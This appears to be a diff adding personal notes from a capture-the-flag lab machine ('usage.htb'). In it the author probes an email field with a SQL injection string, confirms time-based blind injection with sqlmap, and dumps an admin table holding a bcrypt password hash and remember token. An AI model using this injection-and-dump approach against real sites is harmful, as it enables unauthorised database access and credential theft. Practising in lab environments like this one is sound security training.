@@ -1,0 +1,39 @@
+server is running on:
+
+	nginx/1.18.0 (Ubuntu)
+
+
+a sql union exploit could work for this site if theyre using sql?
+
+
+i tried doing '-- in the email address field of the usage.htb page. i got a 500 server error.
+
+when i put in random valid looking email addresses, it would say that the email isnt in the records. this means that the field is vulnerable because i was able to send an invalid but syntactically sound sql query
+ 
+i can use my creds:
+
+user: sleepy@gmail.com
+pass: sleepy
+
+then inject some other statmenet afterwards to see whats on the database.
+
+inject with a union? i think u might be able to because you get an output message if the email is valid on their database
+
+[01:28:29] [INFO] POST parameter 'email' appears to be 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' injectable
+
+
+
+AFTER A LOT OF SQLMAPPING TO FIND THE RIGHT DB TABLE AND COLUMN
+
+Database: usage_blog
+Table: admin_users
+[1 entry]
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+
+
+its hashed...
+but with whawt?
